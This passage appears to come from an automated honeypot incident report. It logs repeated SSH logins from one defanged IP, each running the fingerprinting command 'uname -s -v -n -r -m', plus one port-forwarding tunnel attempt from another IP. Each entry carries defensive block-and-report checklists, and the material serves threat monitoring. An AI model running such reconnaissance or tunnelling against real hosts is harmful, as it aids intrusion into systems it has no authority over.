- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281521a1960d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:12 |
| **Last Seen** | 2026-07-24 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:12:54` | `cowrie.session.connect` |
| `2026-07-24 15:12:54` | `cowrie.client.version` |
| `2026-07-24 15:12:54` | `cowrie.client.kex` |
| `2026-07-24 15:12:54` | `cowrie.login.success` |
| `2026-07-24 15:12:55` | `cowrie.session.params` |
| `2026-07-24 15:12:55` | `cowrie.command.input` |
| `2026-07-24 15:12:55` | `cowrie.log.closed` |
| `2026-07-24 15:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991f4efdd77b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:00` | `cowrie.session.connect` |
| `2026-07-24 15:13:00` | `cowrie.client.version` |
| `2026-07-24 15:13:00` | `cowrie.client.kex` |
| `2026-07-24 15:13:01` | `cowrie.login.success` |
| `2026-07-24 15:13:02` | `cowrie.session.params` |
| `2026-07-24 15:13:02` | `cowrie.command.input` |
| `2026-07-24 15:13:02` | `cowrie.log.closed` |
| `2026-07-24 15:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8c90efd607

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:07` | `cowrie.session.connect` |
| `2026-07-24 15:13:07` | `cowrie.client.version` |
| `2026-07-24 15:13:07` | `cowrie.client.kex` |
| `2026-07-24 15:13:08` | `cowrie.login.success` |
| `2026-07-24 15:13:08` | `cowrie.session.params` |
| `2026-07-24 15:13:08` | `cowrie.command.input` |
| `2026-07-24 15:13:09` | `cowrie.log.closed` |
| `2026-07-24 15:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d7d762bad2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:13` | `cowrie.session.connect` |
| `2026-07-24 15:13:14` | `cowrie.client.version` |
| `2026-07-24 15:13:14` | `cowrie.client.kex` |
| `2026-07-24 15:13:14` | `cowrie.login.success` |
| `2026-07-24 15:13:15` | `cowrie.session.params` |
| `2026-07-24 15:13:15` | `cowrie.command.input` |
| `2026-07-24 15:13:15` | `cowrie.log.closed` |
| `2026-07-24 15:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e25d836187

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:21` | `cowrie.session.connect` |
| `2026-07-24 15:13:21` | `cowrie.client.version` |
| `2026-07-24 15:13:21` | `cowrie.client.kex` |
| `2026-07-24 15:13:21` | `cowrie.login.success` |
| `2026-07-24 15:13:22` | `cowrie.session.params` |
| `2026-07-24 15:13:22` | `cowrie.command.input` |
| `2026-07-24 15:13:22` | `cowrie.log.closed` |
| `2026-07-24 15:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e64c25f2d0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:27` | `cowrie.session.connect` |
| `2026-07-24 15:13:27` | `cowrie.client.version` |
| `2026-07-24 15:13:27` | `cowrie.client.kex` |
| `2026-07-24 15:13:28` | `cowrie.login.success` |
| `2026-07-24 15:13:29` | `cowrie.session.params` |
| `2026-07-24 15:13:29` | `cowrie.command.input` |
| `2026-07-24 15:13:29` | `cowrie.log.closed` |
| `2026-07-24 15:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d445f00b3d7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:33` | `cowrie.session.connect` |
| `2026-07-24 15:13:33` | `cowrie.client.version` |
| `2026-07-24 15:13:33` | `cowrie.client.kex` |
| `2026-07-24 15:13:34` | `cowrie.login.success` |
| `2026-07-24 15:13:35` | `cowrie.session.params` |
| `2026-07-24 15:13:35` | `cowrie.command.input` |
| `2026-07-24 15:13:35` | `cowrie.log.closed` |
| `2026-07-24 15:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd2a8a1d5e7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:40` | `cowrie.session.connect` |
| `2026-07-24 15:13:40` | `cowrie.client.version` |
| `2026-07-24 15:13:40` | `cowrie.client.kex` |
| `2026-07-24 15:13:40` | `cowrie.login.success` |
| `2026-07-24 15:13:41` | `cowrie.session.params` |
| `2026-07-24 15:13:41` | `cowrie.command.input` |
| `2026-07-24 15:13:41` | `cowrie.log.closed` |
| `2026-07-24 15:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4dee8fc895

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:45` | `cowrie.session.connect` |
| `2026-07-24 15:13:45` | `cowrie.client.version` |
| `2026-07-24 15:13:46` | `cowrie.client.kex` |
| `2026-07-24 15:13:46` | `cowrie.login.success` |
| `2026-07-24 15:13:47` | `cowrie.session.params` |
| `2026-07-24 15:13:47` | `cowrie.command.input` |
| `2026-07-24 15:13:47` | `cowrie.log.closed` |
| `2026-07-24 15:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca302c7d2d6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:51` | `cowrie.session.connect` |
| `2026-07-24 15:13:51` | `cowrie.client.version` |
| `2026-07-24 15:13:52` | `cowrie.client.kex` |
| `2026-07-24 15:13:52` | `cowrie.login.success` |
| `2026-07-24 15:13:52` | `cowrie.session.params` |
| `2026-07-24 15:13:52` | `cowrie.command.input` |
| `2026-07-24 15:13:53` | `cowrie.log.closed` |
| `2026-07-24 15:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ebb0e5ae762

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:13 |
| **Last Seen** | 2026-07-24 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:13:57` | `cowrie.session.connect` |
| `2026-07-24 15:13:57` | `cowrie.client.version` |
| `2026-07-24 15:13:57` | `cowrie.client.kex` |
| `2026-07-24 15:13:58` | `cowrie.login.success` |
| `2026-07-24 15:13:58` | `cowrie.session.params` |
| `2026-07-24 15:13:58` | `cowrie.command.input` |
| `2026-07-24 15:13:59` | `cowrie.log.closed` |
| `2026-07-24 15:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaafa7792887

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:03` | `cowrie.session.connect` |
| `2026-07-24 15:14:03` | `cowrie.client.version` |
| `2026-07-24 15:14:03` | `cowrie.client.kex` |
| `2026-07-24 15:14:04` | `cowrie.login.success` |
| `2026-07-24 15:14:05` | `cowrie.session.params` |
| `2026-07-24 15:14:05` | `cowrie.command.input` |
| `2026-07-24 15:14:05` | `cowrie.log.closed` |
| `2026-07-24 15:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2fda5e9b2d0

| Field | Detail |
|---|---|
| **Source IP** | `179.185.227[.]77` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:03` | `cowrie.session.connect` |
| `2026-07-24 15:14:05` | `cowrie.client.version` |
| `2026-07-24 15:14:05` | `cowrie.client.kex` |
| `2026-07-24 15:14:06` | `cowrie.login.success` |
| `2026-07-24 15:14:07` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.227[.]77` to AbuseIPDB if not already reported
- [ ] Block `179.185.227[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326b9ea52e1a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:09` | `cowrie.session.connect` |
| `2026-07-24 15:14:09` | `cowrie.client.version` |
| `2026-07-24 15:14:09` | `cowrie.client.kex` |
| `2026-07-24 15:14:10` | `cowrie.login.success` |
| `2026-07-24 15:14:10` | `cowrie.session.params` |
| `2026-07-24 15:14:10` | `cowrie.command.input` |
| `2026-07-24 15:14:10` | `cowrie.log.closed` |
| `2026-07-24 15:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eaab9e07c03

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:15` | `cowrie.session.connect` |
| `2026-07-24 15:14:15` | `cowrie.client.version` |
| `2026-07-24 15:14:15` | `cowrie.client.kex` |
| `2026-07-24 15:14:15` | `cowrie.login.success` |
| `2026-07-24 15:14:16` | `cowrie.session.params` |
| `2026-07-24 15:14:16` | `cowrie.command.input` |
| `2026-07-24 15:14:16` | `cowrie.log.closed` |
| `2026-07-24 15:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-686a58e724b1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:27` | `cowrie.session.connect` |
| `2026-07-24 15:14:27` | `cowrie.client.version` |
| `2026-07-24 15:14:27` | `cowrie.client.kex` |
| `2026-07-24 15:14:27` | `cowrie.login.success` |
| `2026-07-24 15:14:28` | `cowrie.session.params` |
| `2026-07-24 15:14:28` | `cowrie.command.input` |
| `2026-07-24 15:14:28` | `cowrie.log.closed` |
| `2026-07-24 15:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e67743d46228

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:33` | `cowrie.session.connect` |
| `2026-07-24 15:14:33` | `cowrie.client.version` |
| `2026-07-24 15:14:33` | `cowrie.client.kex` |
| `2026-07-24 15:14:33` | `cowrie.login.success` |
| `2026-07-24 15:14:34` | `cowrie.session.params` |
| `2026-07-24 15:14:34` | `cowrie.command.input` |
| `2026-07-24 15:14:34` | `cowrie.log.closed` |
| `2026-07-24 15:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ffa811aa93

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:39` | `cowrie.session.connect` |
| `2026-07-24 15:14:39` | `cowrie.client.version` |
| `2026-07-24 15:14:39` | `cowrie.client.kex` |
| `2026-07-24 15:14:40` | `cowrie.login.success` |
| `2026-07-24 15:14:41` | `cowrie.session.params` |
| `2026-07-24 15:14:41` | `cowrie.command.input` |
| `2026-07-24 15:14:41` | `cowrie.log.closed` |
| `2026-07-24 15:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1ffeb4bc97

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:45` | `cowrie.session.connect` |
| `2026-07-24 15:14:45` | `cowrie.client.version` |
| `2026-07-24 15:14:45` | `cowrie.client.kex` |
| `2026-07-24 15:14:46` | `cowrie.login.success` |
| `2026-07-24 15:14:46` | `cowrie.session.params` |
| `2026-07-24 15:14:46` | `cowrie.command.input` |
| `2026-07-24 15:14:47` | `cowrie.log.closed` |
| `2026-07-24 15:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa1f35a260b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:51` | `cowrie.session.connect` |
| `2026-07-24 15:14:51` | `cowrie.client.version` |
| `2026-07-24 15:14:51` | `cowrie.client.kex` |
| `2026-07-24 15:14:52` | `cowrie.login.success` |
| `2026-07-24 15:14:52` | `cowrie.session.params` |
| `2026-07-24 15:14:52` | `cowrie.command.input` |
| `2026-07-24 15:14:53` | `cowrie.log.closed` |
| `2026-07-24 15:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-280988a7425d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:14 |
| **Last Seen** | 2026-07-24 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:14:58` | `cowrie.session.connect` |
| `2026-07-24 15:14:58` | `cowrie.client.version` |
| `2026-07-24 15:14:58` | `cowrie.client.kex` |
| `2026-07-24 15:14:58` | `cowrie.login.success` |
| `2026-07-24 15:14:59` | `cowrie.session.params` |
| `2026-07-24 15:14:59` | `cowrie.command.input` |
| `2026-07-24 15:14:59` | `cowrie.log.closed` |
| `2026-07-24 15:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b99cd4c5a1f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:04` | `cowrie.session.connect` |
| `2026-07-24 15:15:04` | `cowrie.client.version` |
| `2026-07-24 15:15:04` | `cowrie.client.kex` |
| `2026-07-24 15:15:04` | `cowrie.login.success` |
| `2026-07-24 15:15:05` | `cowrie.session.params` |
| `2026-07-24 15:15:05` | `cowrie.command.input` |
| `2026-07-24 15:15:05` | `cowrie.log.closed` |
| `2026-07-24 15:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a24d9fcb7f6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:10` | `cowrie.session.connect` |
| `2026-07-24 15:15:10` | `cowrie.client.version` |
| `2026-07-24 15:15:10` | `cowrie.client.kex` |
| `2026-07-24 15:15:10` | `cowrie.login.success` |
| `2026-07-24 15:15:11` | `cowrie.session.params` |
| `2026-07-24 15:15:11` | `cowrie.command.input` |
| `2026-07-24 15:15:11` | `cowrie.log.closed` |
| `2026-07-24 15:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96227093623

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:16` | `cowrie.session.connect` |
| `2026-07-24 15:15:16` | `cowrie.client.version` |
| `2026-07-24 15:15:16` | `cowrie.client.kex` |
| `2026-07-24 15:15:16` | `cowrie.login.success` |
| `2026-07-24 15:15:17` | `cowrie.session.params` |
| `2026-07-24 15:15:17` | `cowrie.command.input` |
| `2026-07-24 15:15:17` | `cowrie.log.closed` |
| `2026-07-24 15:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911d98e67ec7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:21` | `cowrie.session.connect` |
| `2026-07-24 15:15:21` | `cowrie.client.version` |
| `2026-07-24 15:15:22` | `cowrie.client.kex` |
| `2026-07-24 15:15:22` | `cowrie.login.success` |
| `2026-07-24 15:15:23` | `cowrie.session.params` |
| `2026-07-24 15:15:23` | `cowrie.command.input` |
| `2026-07-24 15:15:23` | `cowrie.log.closed` |
| `2026-07-24 15:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49bdc585ebd5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:27` | `cowrie.session.connect` |
| `2026-07-24 15:15:27` | `cowrie.client.version` |
| `2026-07-24 15:15:27` | `cowrie.client.kex` |
| `2026-07-24 15:15:28` | `cowrie.login.success` |
